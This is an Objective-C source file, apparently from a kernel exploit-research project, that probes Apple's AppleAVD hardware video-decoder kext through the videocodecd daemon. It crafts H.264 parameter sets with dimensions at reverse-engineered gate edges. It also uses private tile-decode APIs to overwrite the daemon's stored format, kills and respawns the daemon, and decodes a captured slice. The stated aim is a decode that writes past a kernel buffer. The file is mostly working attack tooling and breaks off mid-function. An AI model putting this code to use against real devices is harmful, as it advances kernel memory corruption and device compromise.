//  probe_avd.m - DirtySlide ROW K: APPLEAVD RESOLUTION-EDGE (v174)
//  THE STATIC CHAIN (Ghidra 09-02, kext 905.40.1, /AppleAVD):
//    - AppleAVDUserClient self-gates at init (FUN_fffffff0084bdaec):
//      IOUserClientEntitlements = com.apple.videotoolbox.hardwarevideodecoder
//      => direct IOServiceOpen(AppleAVD) is DEAD for an app; the path is the
//      videocodecd daemon (VTDecompressionSession -> AVD.videodecoder -> kext).
//    - the UC selector table (__const 0xfffffff007db06d8, 40B stride): structIn
//      up to 0xb50, structOut up to 0xdc8; the session-create request carries
//      width/height at [0]/[1], codecType [3], timeout-override [0x48].
//    - decrypt bounds check (FUN_fffffff0084c155c): AIRTIGHT (explicit CARRY4
//      "Input buffer write will overflow" guard) - dead axis.
//    - setResolutionInfo gate (FUN_fffffff0084beb84): HONEST unsigned max/min,
//      maxDim = 0x41f8 (16888) normally, 0x10000 with the unlimited flag;
//      minLim = (driver+0x178 < 400) ? 0x2000 : 0x4000. NO signed wrap.
//    - driverKernelTimeoutOverride check accepts wrapped u32 (>= 0xFFFF0000).
//    - the FW command PATCH ENGINE (FUN_fffffff0084c6bd4) = bounded kernel
//      bitfield writes into the FW command buffer (offset+2|4 <= cmdBufSize,
//      CARRY4/CARRY8-guarded), value resolved from a USER POINTER or IOSURFACE ID.
//  THE APP-REACHABLE CARRIER: the SPS dims. The plugin parses the bitstream SPS
//  itself ("AVC sps[%d] width %d height %d over size") and drives setResolutionInfo.
//  ROW K fires CRAFTED SPS DIMS AT THE KEXT GATE EDGES through the daemon:
//    AV0 baseline 128x128 captured SPS/PPS (the decode oracle sanity)
//    AV1 SPS 16880x8192  (UNDER maxDim 16888, min AT minLim 8192) = accept-edge
//    AV2 SPS 16896x8192  (OVER maxDim by 8) = the gate REJECT control
//    AV3 SPS 8192x16880  (swapped edges)
//    AV4 SPS 16768x16768 (min 16768 > minLim 8192) = the minLim REJECT probe
//    AV5 SPS 16x16       (below-minimum probe)
//    AV6 divergence: format/dest 64x64 + SPS 16880x8192 (the exceeds-alloc arm)
//  Every cell re-decodes the SAME captured slice under a rebuilt avcC + format.
//  Oracle: dec_out_cb dims, kernel log (setResolutionInfo / DART / GART lines),
//  .ips. A decode that writes past the client buffer = THE 64747. MAY CRASH KERNEL.
#include "ds_core.h"

/* ---- the corpus globals (declared before the builders - r5 SPS builder
 * derives profile/level from the captured SPS) ---- */
static uint8_t *ds_avd_capBytes;      /* the FULL captured sample (AVCC len-prefixed) */
static size_t ds_avd_capLen;
static uint8_t *ds_avd_sps0, *ds_avd_pps0, *ds_avd_slice;
static int ds_avd_sps0Len, ds_avd_pps0Len, ds_avd_sliceLen;
static CMSampleBufferRef ds_avd_rawSB; /* r4: the intact captured sample (AV0 decodes it as-is) */

/* ---- v175-r9: THE TILE PATH (the config-setter) ----
 * VTTileDecompressionSessionCreate (public export, private sig) gates ONLY on
 * w*h > 2^30 pixels CLIENT-SIDE (found in the VT disasm: fmul w*h vs 0x41d0...),
 * then the daemon-side AppleAVDWrapperH264DecoderStartTileSession WRITES the
 * config fields CanAcceptFormatDescription compares ([x19+0x18] = the format,
 * [x19+0x1458] = the dims). Tile-first -> plain HW-REQUIRE create at the same
 * dims passes. The supported-properties dict = the REAL HW tile limits, dumped
 * at runtime (no guessing). */
typedef void *ds_avd_tileSessionRef;
typedef kern_return_t (*ds_avd_pTileCreate)(CFAllocatorRef, CMVideoFormatDescriptionRef,
                                            CFDictionaryRef, CFDictionaryRef, void *, void **);
typedef kern_return_t (*ds_avd_pTileInval)(ds_avd_tileSessionRef);
/* r9-r2: the REAL signature (disasm 0x1905aec84): (session, CFDictionaryRef *outDict)
 * - it writes *out = NULL then tail-calls the RemoteBridge. The r9 single-arg call
 * made it deref leftover register garbage (the 23:27:37 SIGSEGV in
 * CFDictionaryGetCount <- ds_avd_cell). */
typedef kern_return_t (*ds_avd_pTileProps)(ds_avd_tileSessionRef, CFDictionaryRef *);
/* r9-r4: SetTileDecodeRequirements(session, canvasPixelBufferAttributes, tileDecodeRequirementsDesc)
 * (disasm 0x190682794: stores x1->+0x60, x2(retained)->+0x68) + DecodeTile(session, sample,
 * tileId, cropX, cropY, cropW, cropH, pixelBuffer, flags) - 9 args (the disasm reads the 9th
 * from the caller's stack). DecodeTile #1 is what fires the daemon StartTileSession = THE
 * config writer (CanAccept's [0x18]/[0x1458]). Wrong guesses are SAFE (guarded). */
typedef kern_return_t (*ds_avd_pTileReq)(ds_avd_tileSessionRef, CFDictionaryRef, void *);
typedef kern_return_t (*ds_avd_pTileDecode)(ds_avd_tileSessionRef, void *, long,
                                            int, int, int, int, void *, int);
static ds_avd_pTileCreate ds_avd_tileCreate;
static ds_avd_pTileInval ds_avd_tileInval;
static ds_avd_pTileProps ds_avd_tileProps;
static ds_avd_pTileReq ds_avd_tileReq;
static ds_avd_pTileDecode ds_avd_tileDecode;

/* ---- exp-golomb RBSP writer ---- */
typedef struct { uint8_t *b; int cap; int nbits; } ds_avd_bw_t;
static void ds_avd_put(ds_avd_bw_t *w, uint32_t v, int n)
{
    for (int i = n - 1; i >= 0; i--) {
        int bit = (v >> i) & 1;
        int byte = w->nbits >> 3;
        if (byte >= w->cap) return;
        if ((w->nbits & 7) == 0) w->b[byte] = 0;
        if (bit) w->b[byte] |= (uint8_t)(0x80 >> (w->nbits & 7));
        w->nbits++;
    }
}
static void ds_avd_put_ue(ds_avd_bw_t *w, uint32_t v)
{
    int n = 0;
    uint32_t x = v + 1;
    while ((x >> n) > 1) n++;
    ds_avd_put(w, 0, n);
    ds_avd_put(w, x, n + 1);
}
static void ds_avd_put_se(ds_avd_bw_t *w, int32_t v)
{
    uint32_t k = (v > 0) ? (uint32_t)(2 * v - 1) : (uint32_t)(-2 * v);
    ds_avd_put_ue(w, k);
}
static int ds_avd_finish_nal(uint8_t *out, int cap, int nbits)
{
    (void)cap;
    /* rbsp stop bit + align */
    ds_avd_bw_t w = { out, cap, nbits };
    ds_avd_put(&w, 1, 1);
    while (w.nbits & 7) ds_avd_put(&w, 0, 1);
    int n = w.nbits / 8;
    /* emulation prevention (only for the NAL payload AFTER the 1-byte header) */
    static uint8_t ep[512];
    int m = 0, zeros = 0;
    for (int i = 0; i < n && m < (int)sizeof(ep) - 4; i++) {
        if (zeros == 2 && out[i] <= 3) { ep[m++] = 3; zeros = 0; }
        ep[m++] = out[i];
        zeros = (out[i] == 0) ? zeros + 1 : 0;
    }
    memcpy(out, ep, (size_t)m);
    return m;
}
static int ds_avd_sps_build(uint8_t *out, int cap, int w, int h)
{
    ds_avd_bw_t bw = { out, cap, 0 };
    ds_avd_put(&bw, 3, 3);       /* nal_ref_idc */
    ds_avd_put(&bw, 7, 5);       /* nal_unit_type = SPS */
    /* v174-r5: derive profile/compat/level from the CAPTURED SPS - the r4 craft
     * (Baseline/66 + level 62) returned unimpErr(-4) at the plugin capability
     * table for EVERY dim incl 16x16 = a profile/level artifact, not the gate */
    uint8_t prof = ds_avd_sps0 ? ds_avd_sps0[1] : 66;
    uint8_t compat = ds_avd_sps0 ? ds_avd_sps0[2] : 0;
    uint8_t level = ds_avd_sps0 ? ds_avd_sps0[3] : 40;
    ds_avd_put(&bw, prof, 8);
    ds_avd_put(&bw, compat, 8);
    ds_avd_put(&bw, level, 8);
    ds_avd_put_ue(&bw, 0);       /* seq_parameter_set_id */
    /* r5: High-profile grammar - chroma/bit-depth fields come BEFORE
     * log2_max_frame_num_minus4 (H.264 7.3.2.1.1); without them the daemon
     * parses the wrong bits */
    if (prof == 100 || prof == 110 || prof == 122 || prof == 244 || prof == 44 ||
        prof == 83 || prof == 86 || prof == 118 || prof == 128 || prof == 138 ||
        prof == 139 || prof == 134 || prof == 135) {
        ds_avd_put_ue(&bw, 1);   /* chroma_format_idc = 4:2:0 */
        ds_avd_put_ue(&bw, 0);   /* bit_depth_luma_minus8 */
        ds_avd_put_ue(&bw, 0);   /* bit_depth_chroma_minus8 */
        ds_avd_put(&bw, 0, 1);   /* qpprime_y_zero_transform_bypass_flag */
        ds_avd_put(&bw, 0, 1);   /* seq_scaling_matrix_present_flag */
    }
    ds_avd_put_ue(&bw, 0);       /* log2_max_frame_num_minus4 */
    ds_avd_put_ue(&bw, 2);       /* pic_order_cnt_type = 2 */
    ds_avd_put_ue(&bw, 1);       /* max_num_ref_frames */
    ds_avd_put(&bw, 0, 1);       /* gaps_in_frame_num_value_allowed */
    ds_avd_put_ue(&bw, (uint32_t)(w / 16 - 1));
    ds_avd_put_ue(&bw, (uint32_t)(h / 16 - 1));
    ds_avd_put(&bw, 1, 1);       /* frame_mbs_only_flag */
    ds_avd_put(&bw, 1, 1);       /* direct_8x8_inference_flag */
    ds_avd_put(&bw, 0, 1);       /* frame_cropping_flag */
    ds_avd_put(&bw, 0, 1);       /* vui_parameters_present */
    return ds_avd_finish_nal(out, cap, bw.nbits);
}
static int ds_avd_pps_build(uint8_t *out, int cap)
{
    ds_avd_bw_t bw = { out, cap, 0 };
    ds_avd_put(&bw, 3, 3);
    ds_avd_put(&bw, 8, 5);       /* PPS */
    ds_avd_put_ue(&bw, 0);       /* pic_parameter_set_id */
    ds_avd_put_ue(&bw, 0);       /* seq_parameter_set_id */
    /* v174-r5: the captured slice is High-profile CABAC - the PPS must say
     * entropy_coding_mode=1 or the slice parses as garbage (BadData) */
    ds_avd_put(&bw, 1, 1);       /* entropy_coding_mode = CABAC */
    ds_avd_put(&bw, 0, 1);       /* pic_order_present_flag */
    ds_avd_put_ue(&bw, 0);       /* num_slice_groups_minus1 */
    ds_avd_put_ue(&bw, 0);       /* num_ref_idx_l0_minus1 */
    ds_avd_put_ue(&bw, 0);       /* num_ref_idx_l1_minus1 */
    ds_avd_put(&bw, 0, 1);       /* weighted_pred */
    ds_avd_put(&bw, 0, 2);       /* weighted_bipred_idc */
    ds_avd_put_se(&bw, 0);       /* pic_init_qp_minus26 */
    ds_avd_put_se(&bw, 0);       /* pic_init_qs_minus26 */
    ds_avd_put_se(&bw, 0);       /* chroma_qp_index_offset */
    ds_avd_put(&bw, 0, 1);       /* deblocking_filter_control_present */
    ds_avd_put(&bw, 0, 1);       /* constrained_intra_pred */
    ds_avd_put(&bw, 0, 1);       /* redundant_pic_cnt_present */
    return ds_avd_finish_nal(out, cap, bw.nbits);
}

/* ---- the row ---- */

/* the corpus extraction: split the captured AVCC sample into SPS/PPS/slice */
static int ds_avd_extract_corpus(const char *pfx)
{
    if (!g_ave_cap_sb) { dprintf(STDOUT_FILENO, "%s  K[cap] NO CAPTURED SAMPLE\n", pfx); return -1; }
    CMBlockBufferRef bb = CMSampleBufferGetDataBuffer(g_ave_cap_sb);
    if (!bb) return -1;
    size_t tot = CMBlockBufferGetDataLength(bb);
    if (tot < 16 || tot > 4 * 1024 * 1024) return -1;
    ds_avd_capBytes = (uint8_t *)malloc(tot);
    if (!ds_avd_capBytes) return -1;
    ds_avd_capLen = tot;
    if (CMBlockBufferCopyDataBytes(bb, 0, tot, ds_avd_capBytes) != kCMBlockBufferNoErr) return -1;
    size_t off = 0;
    ds_avd_sps0 = ds_avd_pps0 = ds_avd_slice = NULL;
    while (off + 4 <= ds_avd_capLen) {
        uint32_t nl = (ds_avd_capBytes[off] << 24) | (ds_avd_capBytes[off+1] << 16) |
                      (ds_avd_capBytes[off+2] << 8) | ds_avd_capBytes[off+3];
        if (nl == 0 || nl > ds_avd_capLen - off - 4) break;
        uint8_t *nal = ds_avd_capBytes + off + 4;
        int t = nal[0] & 0x1f;
        if (t == 7 && !ds_avd_sps0) { ds_avd_sps0 = nal; ds_avd_sps0Len = (int)nl; }
        else if (t == 8 && !ds_avd_pps0) { ds_avd_pps0 = nal; ds_avd_pps0Len = (int)nl; }
        else if ((t == 5 || t == 1) && !ds_avd_slice) { ds_avd_slice = ds_avd_capBytes + off; ds_avd_sliceLen = (int)(nl + 4); }
        off += 4 + nl;
    }
    /* v174-fix: VT puts SPS/PPS in the sample's FORMAT DESCRIPTION (avcC), not the
     * block buffer - pull them via the H264 param-set accessor */
    if (!ds_avd_sps0 || !ds_avd_pps0) {
        CMFormatDescriptionRef fd = CMSampleBufferGetFormatDescription(g_ave_cap_sb);
        if (fd) {
            size_t cnt = 0, len = 0;
            int hdr = 0;
            const uint8_t *p = NULL;
            if (!ds_avd_sps0 &&
                CMVideoFormatDescriptionGetH264ParameterSetAtIndex((CMVideoFormatDescriptionRef)fd, 0,
                    &p, &len, &cnt, &hdr) == 0 && p && len > 0) {
                ds_avd_sps0 = (uint8_t *)p; ds_avd_sps0Len = (int)len;
            }
            if (!ds_avd_pps0 &&
                CMVideoFormatDescriptionGetH264ParameterSetAtIndex((CMVideoFormatDescriptionRef)fd, 1,
                    &p, &len, &cnt, &hdr) == 0 && p && len > 0) {
                ds_avd_pps0 = (uint8_t *)p; ds_avd_pps0Len = (int)len;
            }
            dprintf(STDOUT_FILENO, "%s  K[cap] param sets pulled from the format description (avcC)\n", pfx);
        }
    }
    /* v174-r3: COPY the borrowed param sets - CMVideoFormatDescriptionGetH264
     * ParameterSetAtIndex returns a pointer INTO the sample's format description,
     * which dies with the sample release (the r1 run's AV0 SPS head=00000000) */
    static uint8_t ds_avd_sps0buf[64], ds_avd_pps0buf[64];
    if (ds_avd_sps0 && ds_avd_sps0Len <= (int)sizeof(ds_avd_sps0buf)) {
        memcpy(ds_avd_sps0buf, ds_avd_sps0, (size_t)ds_avd_sps0Len);
        ds_avd_sps0 = ds_avd_sps0buf;
    }
    if (ds_avd_pps0 && ds_avd_pps0Len <= (int)sizeof(ds_avd_pps0buf)) {
        memcpy(ds_avd_pps0buf, ds_avd_pps0, (size_t)ds_avd_pps0Len);
        ds_avd_pps0 = ds_avd_pps0buf;
    }
    dprintf(STDOUT_FILENO, "%s  K[cap] sample %zu bytes: sps=%d pps=%d slice=%d (type5 kept)\n",
            pfx, ds_avd_capLen, ds_avd_sps0Len, ds_avd_pps0Len, ds_avd_sliceLen);
    return (ds_avd_sps0 && ds_avd_pps0 && ds_avd_slice) ? 0 : -1;
}

/* one decode cell: craft SPS (or reuse captured for cw<0), build avcC+format,
 * create the HW session, decode the captured slice, receipt.
 * v174-r7: resetDaemon=1 kills videocodecd first (ds_tk_kill, ~12s respawn) -
 * CanAcceptFormatDescription (0x29ff2d17c) is a SINGLETON compare: the decoder
 * instance pins the FIRST format (CFEqual [x19+0x18] fast-path, dims vs
 * [x19+0x1458]/[0x145c], bit-depths vs [x23+0..3]) and every later create with
 * different dims returns 0 -> VT -12911 NotAvailableNowErr (the r4-r6 uniform
 * failure). A fresh daemon = the cell's dims become the first-seen format. */
static void ds_avd_cell(const char *pfx, const char *tag, const char *note,
                        int32_t cw, int32_t ch, int fmtW, int fmtH, int resetDaemon, int tileFirst)
{
    char stag[48];
    snprintf(stag, sizeof(stag), "AVD %s", tag);
    ds_journal_write("START", stag);
    ds_epoch_bump(pfx, tag);
    dprintf(STDOUT_FILENO, "%s== K. %s ==\n", pfx, tag);
    dprintf(STDOUT_FILENO, "%s  K[%s] %s\n", pfx, tag, note);
    dprintf(STDOUT_FILENO, "%s  K[%s] SPS %dx%d | format %dx%d | dest IOSurface-backed%s\n", pfx, tag, cw, ch, fmtW, fmtH,
            resetDaemon ? " | daemon RESET before create (the singleton pins the first format)" : "");
    if (!ds_avd_slice) {
        dprintf(STDOUT_FILENO, "%s  K[%s] no corpus - cell void\n", pfx, tag);
        ds_journal_write("DONE", "AVD no-corpus");
        return;
    }
    if (resetDaemon) {
        dprintf(STDOUT_FILENO, "%s  K[%s] killing videocodecd (fresh singleton for THIS cell's dims)...\n", pfx, tag);
        ds_tk_kill(pfx, tag);
        for (int w = 0; w < 26; w++) usleep(500000);   /* the 12s respawn window + slack */
        dprintf(STDOUT_FILENO, "%s  K[%s] respawn wait done (13s)\n", pfx, tag);
    }
    uint8_t sps[512], pps[64];
    int spsLen, ppsLen;
    if (cw < 0) {
        spsLen = ds_avd_sps0Len;
        memcpy(sps, ds_avd_sps0, (size_t)spsLen);
        ppsLen = ds_avd_pps0Len;
        memcpy(pps, ds_avd_pps0, (size_t)ppsLen);
    } else {
        spsLen = ds_avd_sps_build(sps, (int)sizeof(sps), cw, ch);
        ppsLen = ds_avd_pps_build(pps, (int)sizeof(pps));
    }
    dprintf(STDOUT_FILENO, "%s  K[%s] SPS %d bytes head=%02x%02x%02x%02x\n", pfx, tag,
            spsLen, sps[0], sps[1], sps[2], sps[3]);

    /* avcC atom */
    int avcCSize = 8 + 2 + spsLen + 1 + 2 + ppsLen;
    uint8_t *avcC = (uint8_t *)malloc((size_t)avcCSize);
    if (!avcC) { ds_journal_write("DONE", "AVD oom"); return; }
    int o = 0;
    avcC[o++] = 1; avcC[o++] = sps[1]; avcC[o++] = sps[2]; avcC[o++] = sps[3];
    avcC[o++] = 0xff; avcC[o++] = 0xe1;
    avcC[o++] = (uint8_t)(spsLen >> 8); avcC[o++] = (uint8_t)spsLen;
    memcpy(avcC + o, sps, (size_t)spsLen); o += spsLen;
    /* v174-r6 THE ROOT CAUSE of every -4: this byte is numOfPictureParameterSets
     * (8 bits) - 0xE1 = 225 PPS entries = an invalid avcC = unimpErr at create.
     * The SPS/PPS payloads were always bit-perfect; the CONTAINER was broken. */
    avcC[o++] = 0x01;
    avcC[o++] = (uint8_t)(ppsLen >> 8); avcC[o++] = (uint8_t)ppsLen;
    memcpy(avcC + o, pps, (size_t)ppsLen); o += ppsLen;
    CFDataRef avcCData = CFDataCreate(kCFAllocatorDefault, avcC, o);
    free(avcC);
    CFStringRef atomsKey = kCMFormatDescriptionExtension_SampleDescriptionExtensionAtoms;
    CFStringRef avcCKey = CFStringCreateWithCString(kCFAllocatorDefault, "avcC", kCFStringEncodingUTF8);
    CFMutableDictionaryRef atoms = CFDictionaryCreateMutable(kCFAllocatorDefault, 0,
        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    if (avcCKey) CFDictionarySetValue(atoms, avcCKey, avcCData);
    CFMutableDictionaryRef ext = CFDictionaryCreateMutable(kCFAllocatorDefault, 0,
        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    CFDictionarySetValue(ext, atomsKey, atoms);

    /* r4: raw mode = decode the INTACT captured sample under its own format */
    int raw = (ds_avd_rawSB != NULL && strcmp(tag, "AV0") == 0);
    CMVideoFormatDescriptionRef fmt = NULL;
    if (raw) {
        fmt = (CMVideoFormatDescriptionRef)CMSampleBufferGetFormatDescription(ds_avd_rawSB);
        dprintf(STDOUT_FILENO, "%s  K[%s] RAW mode: the intact captured sample + its own format desc\n", pfx, tag);
    } else {
        OSStatus st0 = CMVideoFormatDescriptionCreate(kCFAllocatorDefault, kCMVideoCodecType_H264,
                                                      fmtW, fmtH, ext, &fmt);
        dprintf(STDOUT_FILENO, "%s  K[%s] format create st=%d dims=%dx%d\n", pfx, tag, (int)st0, fmtW, fmtH);
    }
    /* r6: client-side avcC validation - read the param sets BACK out of MY format
     * (free, no daemon op). count must be 2 and lengths must match; a mismatch
     * means the container is broken and the session create will fail regardless */
    if (fmt && !raw) {
        size_t pcnt = 0, plen = 0;
        int phdr = 0;
        const uint8_t *pp = NULL;
        OSStatus ps = CMVideoFormatDescriptionGetH264ParameterSetAtIndex(fmt, 0, &pp, &plen, &pcnt, &phdr);
        dprintf(STDOUT_FILENO, "%s  K[%s] avcC readback st=%d paramSets=%zu spsLen=%zu nalLen=%d%s\n",
                pfx, tag, (int)ps, pcnt, plen, phdr,
                (ps == 0 && pcnt == 2 && plen == (size_t)spsLen) ? " (container VALID)" : " *** CONTAINER BROKEN ***");
    }
    OSStatus st = (fmt != NULL) ? 0 : -1;
    if (st == 0 && fmt) {
        /* dest: IOSurface-backed (the write-bound surface) */
        CFMutableDictionaryRef dest = CFDictionaryCreateMutable(kCFAllocatorDefault, 0,
            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
        CFMutableDictionaryRef iosProps = CFDictionaryCreateMutable(kCFAllocatorDefault, 0,
            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
        if (dest && iosProps) CFDictionarySetValue(dest, kCVPixelBufferIOSurfacePropertiesKey, iosProps);
        /* r9 TILE-FIRST: set the daemon config to OUR dims via the tile session,
         * then the plain create passes CanAccept. Keep the tile session OPEN
         * through the plain create + decode. */
        void *ts = NULL;
        int tileOpen = 0;
        if (tileFirst && ds_avd_tileCreate && fmt) {
            __block VTDecompressionOutputCallbackRecord tcb = { dec_out_cb, NULL };
            __block void *tsb = NULL;
            __block OSStatus tst = -1;
            int rc9 = 0, sig9 = 0;
            sig9 = ds_ave_guard_run_tmo(^int {
                tst = ds_avd_tileCreate(kCFAllocatorDefault, fmt, NULL, dest, &tcb, &tsb);
                return 0;
            }, &rc9, 8000);
            ts = tsb;
            dprintf(STDOUT_FILENO, "%s  K[%s] VTTileDecompressionSessionCreate st=%d ts=%p (canvas %dx%d = %lld px, gate 2^30=%d) sig=%d\n",
                    pfx, tag, (int)tst, ts, fmtW, fmtH, (long long)fmtW * (long long)fmtH,
                    ((long long)fmtW * fmtH) <= (1LL << 30) ? 1 : 0, sig9);
            if (sig9 == 0 && tst == 0 && ts) {
                tileOpen = 1;
                if (ds_avd_tileProps) {
                    __block CFDictionaryRef db = NULL;
                    __block OSStatus pst = -1;
                    int prc = 0, psig = 0;
                    psig = ds_ave_guard_run_tmo(^int {
                        pst = ds_avd_tileProps(ts, &db);
                        return 0;
                    }, &prc, 4000);
                    if (psig == 0 && pst == 0 && db &&
                        CFGetTypeID(db) == CFDictionaryGetTypeID()) {
                        CFIndex n = CFDictionaryGetCount(db);
                        dprintf(STDOUT_FILENO, "%s  K[%s] TILE HW LIMITS (supported props, %ld entries):\n", pfx, tag, (long)n);
                        CFTypeRef *keys = malloc(sizeof(CFTypeRef) * (size_t)(n > 0 ? n : 1));
                        CFTypeRef *vals = malloc(sizeof(CFTypeRef) * (size_t)(n > 0 ? n : 1));
                        if (keys && vals) {
                            CFDictionaryGetKeysAndValues(db, keys, vals);
                            for (CFIndex i = 0; i < n && i < 24; i++) {
                                char kb[96] = "?", vb[256] = "?";
                                if (keys[i] && CFGetTypeID(keys[i]) == CFStringGetTypeID())
                                    CFStringGetCString((CFStringRef)keys[i], kb, sizeof(kb), kCFStringEncodingUTF8);
                                /* r9-r3: CFCopyDescription = type-safe for ANY CF value
                                 * (the r9-r2 printer only handled str/num/bool and hid
                                 * the nested dicts: CanvasPixelBufferAttributes /
                                 * TileDecoderRequirements / NegotiationDetails) */
                                if (vals[i]) {
                                    CFStringRef desc = CFCopyDescription(vals[i]);
                                    if (desc) {
                                        CFStringGetCString(desc, vb, sizeof(vb), kCFStringEncodingUTF8);
                                        CFRelease(desc);
                                    }
                                }
                                dprintf(STDOUT_FILENO, "%s  K[%s]   %s = %s\n", pfx, tag, kb, vb);
                            }
                        }
                        free(keys); free(vals);
                        CFRelease(db);
                    } else dprintf(STDOUT_FILENO, "%s  K[%s] TILE HW LIMITS: st=%d sig=%d dict=%p type=%s\n",
                                   pfx, tag, (int)pst, psig, (void *)db,
                                   (db && CFGetTypeID(db) == CFDictionaryGetTypeID()) ? "dict" : "NOT-DICT");
                }
                /* r9-r4: the START-TILE-SESSION trigger ladder (each step guarded;
                 * StartTileSession runs BEFORE any data parse, so even a BadData
                 * tile decode leaves the config = our dims) */
                if (ds_avd_tileReq) {
                    __block CFMutableDictionaryRef canvas = NULL;
                    int crc = 0, csig = 0;
                    __block OSStatus crst = -1;
                    csig = ds_ave_guard_run_tmo(^int {
                        canvas = CFDictionaryCreateMutable(kCFAllocatorDefault, 0,
                            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
                        CFDictionarySetValue(canvas, kCVPixelBufferIOSurfacePropertiesKey, iosProps);
                        CFNumberRef w = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &fmtW);
                        CFNumberRef h = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &fmtH);
                        if (w) CFDictionarySetValue(canvas, kCVPixelBufferWidthKey, w);
                        if (h) CFDictionarySetValue(canvas, kCVPixelBufferHeightKey, h);
                        if (w) CFRelease(w);
                        if (h) CFRelease(h);
                        crst = ds_avd_tileReq(ts, canvas, fmt);
                        return 0;
                    }, &crc, 4000);
                    dprintf(STDOUT_FILENO, "%s  K[%s] SetTileDecodeRequirements st=%d sig=%d\n", pfx, tag, (int)crst, csig);
                    if (canvas) CFRelease(canvas);
                }
                if (ds_avd_tileDecode && ds_avd_rawSB) {
                    __block OSStatus dst2 = -1;
                    int drc = 0, dsig = 0;
                    dsig = ds_ave_guard_run_tmo(^int {
                        dst2 = ds_avd_tileDecode(ts, ds_avd_rawSB, 0, 0, 0, fmtW, fmtH, NULL, 0);
                        usleep(300000);
                        return 0;
                    }, &drc, 6000);
                    dprintf(STDOUT_FILENO, "%s  K[%s] DecodeTile#1 st=%d sig=%d (this fired the daemon StartTileSession: config = %dx%d)\n",
                            pfx, tag, (int)dst2, dsig, fmtW, fmtH);
                }
            }
        }
        VTDecompressionOutputCallbackRecord cb = { dec_out_cb, NULL };
        VTDecompressionSessionRef vs = NULL;
        /* v174-r4: REQUIRE HW (not just enable) - a SW fallback makes the row a
         * no-op (no daemon, no kext). st!=0 here = the plugin/gate refused. */
        CFMutableDictionaryRef spec = CFDictionaryCreateMutable(kCFAllocatorDefault, 0,
            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
        CFDictionarySetValue(spec, kVTVideoDecoderSpecification_EnableHardwareAcceleratedVideoDecoder, kCFBooleanTrue);
        CFDictionarySetValue(spec, kVTVideoDecoderSpecification_RequireHardwareAcceleratedVideoDecoder, kCFBooleanTrue);
        st = VTDecompressionSessionCreate(kCFAllocatorDefault, fmt,
            spec, dest, &cb, &vs);
        if (spec) CFRelease(spec);
        dprintf(STDOUT_FILENO, "%s  K[%s] VTDecompressionSessionCreate(HW-REQUIRE) st=%d\n", pfx, tag, (int)st);
        if (st == 0 && vs) {
            CMSampleBufferRef sb = NULL;
            CMBlockBufferRef bb = NULL;
            if (raw) {
                sb = ds_avd_rawSB;
                dprintf(STDOUT_FILENO, "%s  K[%s] sample = RAW captured (%zu bytes)\n", pfx, tag, ds_avd_capLen);
            } else {
            /* v174-r3: blockAllocator = kCFAllocatorNull - the canonical "wrap
             * memory we do NOT own" pattern. r1 passed NULL (CFRetain(NULL+0x47f)
             * = the 19:41:01 SIGBUS); r2 passed a custom source with AllocateBlock
             * NULL (-12702 kCMBlockBufferBadCustomBlockSourceErr). */
            OSStatus b = CMBlockBufferCreateWithMemoryBlock(kCFAllocatorDefault, ds_avd_slice,
                (size_t)ds_avd_sliceLen, kCFAllocatorNull, NULL, 0,
                (size_t)ds_avd_sliceLen, 0, &bb);
            if (b == 0 && bb) {
                CMSampleTimingInfo ti = { CMTimeMake(1000, 600), CMTimeMake(0, 600), CMTimeMake(0, 600) };
                OSStatus s2 = CMSampleBufferCreate(kCFAllocatorDefault, bb, TRUE, NULL, NULL,
                                                   fmt, 1, 1, &ti, 0, NULL, &sb);
                dprintf(STDOUT_FILENO, "%s  K[%s] sample create st=%d (%d slice bytes)\n", pfx, tag, (int)s2, ds_avd_sliceLen);
                if (s2 != 0) sb = NULL;
            } else dprintf(STDOUT_FILENO, "%s  K[%s] block buffer st=%d\n", pfx, tag, (int)b);
            }
            if (sb) {
                    unsigned long f0 = (unsigned long)g_dec_cb_fires;
                    VTDecodeInfoFlags fl = 0;
                    int rc = 0, sig = 0;
                    __block OSStatus dst = -1;
                    sig = ds_ave_guard_run_tmo(^int {
                        dst = VTDecompressionSessionDecodeFrame(vs, sb, fl, NULL, NULL);
                        for (int w = 0; w < 60 && (long)g_dec_cb_fires == f0; w++) usleep(50000);
                        return 0;
                    }, &rc, 6000);
                    if (sig == SIGALRM) dprintf(STDOUT_FILENO, "%s  K[%s] TIMEOUT (6s)\n", pfx, tag);
                    else if (sig > 0) dprintf(STDOUT_FILENO, "%s  K[%s] CLIENT-FAULT sig=%d @0x%lx\n", pfx, tag, sig, (unsigned long)g_ave_fault_addr);
                    else {
                        dprintf(STDOUT_FILENO, "%s  K[%s] DecodeFrame st=%d (fl=%x) cb fired=%ld ok=%ld err=%d out=%lldx%lld\n",
                                pfx, tag, (int)dst, fl,
                                (long)(g_dec_cb_fires - f0), (long)g_dec_cb_ok, g_dec_cb_err,
                                g_dec_out_w, g_dec_out_h);
                        if ((long)(g_dec_cb_fires - f0) > 0 && g_dec_out_w != fmtW)
                            dprintf(STDOUT_FILENO, "%s  K[%s] *** OUT-DIMS %lldx%lld != format %dx%d - the daemon re-derived from the SPS ***\n",
                                    pfx, tag, g_dec_out_w, g_dec_out_h, fmtW, fmtH);
                    }
                    if (!raw) CFRelease(sb);
            }
            if (bb) CFRelease(bb);
            VTDecompressionSessionInvalidate(vs);
            CFRelease(vs);
        }
        if (dest) CFRelease(dest);
        if (iosProps) CFRelease(iosProps);
        if (tileOpen && ts && ds_avd_tileInval) ds_avd_tileInval(ts);   /* r9: AFTER the plain create + decode */
    }
    if (fmt && !raw) CFRelease(fmt);
    if (ext) CFRelease(ext);
    if (atoms) CFRelease(atoms);
    if (avcCData) CFRelease(avcCData);
    if (avcCKey) CFRelease(avcCKey);
    ds_journal_write("DONE", stag);
}

/* the corpus capture: 2-frame 128x128 H264 encode with the v77 capture hook */
static int ds_avd_capture(const char *pfx)
{
    dprintf(STDOUT_FILENO, "%s  K[cap] encoding 2 frames 128x128 H264 (the corpus capture)\n", pfx);
    g_ave_cap_on = 1; g_ave_cap_sb = NULL;
    VTCompressionSessionRef cs = NULL;
